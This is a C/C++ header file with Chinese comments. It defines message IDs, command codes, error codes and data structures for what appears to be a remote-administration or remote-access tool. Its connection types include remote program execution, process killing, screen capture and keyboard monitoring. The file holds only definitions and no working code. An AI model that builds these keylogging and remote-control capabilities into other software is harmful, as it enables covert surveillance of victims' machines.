/*
*	公共变量,函数定义
*/

#include "resource.h"

//私有定义
#define WM_EDITLABLE			WM_USER + 900		//编辑标题
#define WM_USERRCLICKPROCESS	WM_USER + 901		//用户击右键(进程)
#define WM_SETMYCURSOR			WM_USER + 902		//光标控制
#define WM_TREESELCHANGED		WM_USER + 907		//目录列表左视双击
#define WM_DIRLEFTRCLICK		WM_USER + 908		//目录列表左视单击
#define WM_DIRLEFTRENAMEOK		WM_USER + 909		//目录列表左视更名
#define WM_DIRRIGHTRCLICK		WM_USER + 910		//目录列表右视单击
#define WM_DIRRIGHTRENAMEOK		WM_USER + 911		//目录列表右视更名
#define WM_INSERTMYITEM			WM_USER + 912		//增加项目
#define WM_FILETRANSRCLICK		WM_USER + 916		//文件列表右键击
#define WM_FILE_TRANS			WM_USER + 601		//文件传输
#define WM_FILESTATUS			WM_USER + 602		//文件状态
#define WM_GETSOCKET			WM_USER + 603		//取套接字
#define WM_CLOSEITEM			WM_USER + 604		//客户关闭
#define WM_INITSOCKET			WM_USER + 605		//初始化套接字
#define WM_GET_FILE				WM_USER + 606		//取文件下载	
#define WM_TRANS_STATE			WM_USER + 607		//文件状态	
#define WM_TRANS_INFO			WM_USER + 608		//文件信息	

//操作客户
#define CLIENT_FILE				1					//客户文件
#define CLIENT_DIR				2					//客户目录
#define CLIENT_DISK				3					//客户磁盘

//公共定义

#define TRAN_DATA_LEN			2048 * 1024			//数据交换长度

#define CLIENT_DISK_INFO		5001				//取磁盘信息
#define CLIENT_FILE_INFO		5002				//取文件信息
#define CLIENT_DIR_INFO			5003				//取目录信息
#define CLIENT_DIR_LIST			5004				//列举目录
#define CLIENT_FILE_DELETE		5005				//删除文件
#define CLIENT_CREATE_DIR		5006				//新建目录
#define CLIENT_RENAME			5007				//更名或新建
#define CLIENT_DISK_LIST		5008				//取磁盘列表
#define CLIENT_EXEC_FILE		5009				//远程运行程序
#define CLIENT_PROCESS_KILL		5010				//终止用户进程
#define CLIENT_COPY_DIR_LIST	5017				//客户目录拷贝列表
#define CLIENT_FIND_FILE		5024				//查找文件
#define CLIENT_UP_FILE			5025				//上载文件
#define CLIENT_DL_FILE			5026				//下载文件
#define CLIENT_TRANS_FILE_START	5027				//开始后台传输文件
#define CLIENT_TRANS_FILE_STOP	5028				//停止后台传输文件

#define NOT_FIND_ANY_FILE		7000				//找不到任何文件
#define CAN_NOT_OPEN_OBJECE		7001				//无法打开指定目录
#define INVALID_COMMAND			7002				//无效命令
#define CAN_NOT_OPEN_FILE		7003				//无法打开文件
#define GET_DISK_INFO_FAIL		7004				//取磁盘信息失败
#define EXEC_FILE_FAIL			7005				//远程运行程序失败
#define RENAME_FAILE			7015				//更名失败
#define CREATE_DIR_FAILE		7016				//创建目录失败
#define COMMAND_PARAM_ERR		7017				//参数错误
#define OPEB_REG_KEY_ERR		7018				//无法打开指定键值
#define CAN_NOT_CREATE_TMP_FILE 7019				//无法创建临时文件

#define TRANS_DATA_ERR			8000				//通信错误
#define TIMER_FILE_TRANS		60000				//文件传输定时器
#define TIMER_SAVE_TRANS		60001				//文件传输定时器

#define CONN_MAIN				3000				//控制连接
#define CONN_FILE_MAIN			3001				//主要连接
#define CONN_FRAM				3003				//屏幕连接
#define CONN_FILE_UP			3004				//上传文件
#define CONN_FILE_DL			3005				//下载文件
#define CONN_KEY				3006				//键盘监控
#define CONN_TLNT				3007				//超级终端

#define CONN_FILE_MANA_SEND		4001				//文件管理发送管道
#define CONN_FILE_MANA_RECV		4002				//文件管理接收管道

typedef struct _FILEINFO_
{
	UINT cmd;
	char local[256];
	char remote[256];
	char size[64];
}FILEINFO,*LPFILEINFO;

typedef struct _CPFILEINFO_
{
	char name[256];
	UINT len;
}CPFILEINFO,*LPCPFILEINFO;

typedef struct _SAVEFILEINFO_
{
	char	m_LocalFile[256];
	char	m_LoadWay[20];
	char	m_RemoteFile[256];
	char	m_FilePoint[50];
	char	m_FileLen[50];
	char	m_FileState[50];
}SAVEFILEINFO,*LPSAVEFILEINFO;

typedef struct _MYLISTFILEINFO_
{
	HWND	hWnd;
	UINT	m_FileLen;
	UINT	m_FilePoint;
	BOOL	m_IsExec;
	char	m_LocalFile[256];
	char	m_RemoteFile[256];
}MYLISTFILEINFO,*LPMYLISTFILEINFO;

typedef struct _MYICONINFO_
{
	char m_Ext[5];
	int  m_Index;
}MYICONINFO,*LPMYICONINFO;

typedef struct _DIRINFO_
{
	CFileStatus m_FileStatus;
	int m_FileCount;
	int m_DirCount;
	ULONGLONG m_AllFileSize;
}DIRINFO,*LPDIRINFO;

typedef struct _DISKINFO_
{
	ULONGLONG	FreeBytesAvailable;  
	ULONGLONG	TotalNumberOfBytes;   
	ULONGLONG	TotalNumberOfFreeBytes;
	char		m_Volume[128];
	char		m_FileSys[128];
	int			m_DeviceType;
	char		m_Name[30];
}DISKINFO,*LPDISKINFO;

typedef struct _DIRLIST_
{
	char m_ItemName[256];
	BYTE m_ItemType;
	LONG m_FileLen;
	char m_ModifyTime[20];
}DIRLIST,*LPDIRLIST;

typedef struct _DIRFILELIST_
{
	char m_ItemPath[256];
	char m_ItemSize[20];
	BYTE m_ItemType;
	char m_ModifyTime[20];
}DIRFILELIST,*LPDIRFILELIST;

typedef struct _CLIENTDATA_
{
	char*	m_TransData;
	DWORD	m_TransLen;
	HANDLE  m_WorkEvent;
	UINT	m_Command;
	HANDLE	m_ThreadHandle;
	SOCKET	m_SendSocket;
	SOCKET	m_RecvSocket;
	HWND	hParent;
	BOOL	m_IsWork;
}CLIENTDATA,*LPCLIENTDATA;

typedef struct _FILETHREADINFO_
{
	BOOL	bExit;
	HWND	hWnd;
	SOCKET	soCmd;
	SOCKET	soData;
}FILETHREADINFO,*LPFILETHREADINFO;

void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);

void DlFileExecThread(LPVOID lPvoid);
void UpFileExecThread(LPVOID lPvoid);
void TransBagThread(LPVOID lPvoid);

BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
BOOL SendBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ReadBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ProcessOneTrans(LPCLIENTDATA pData);



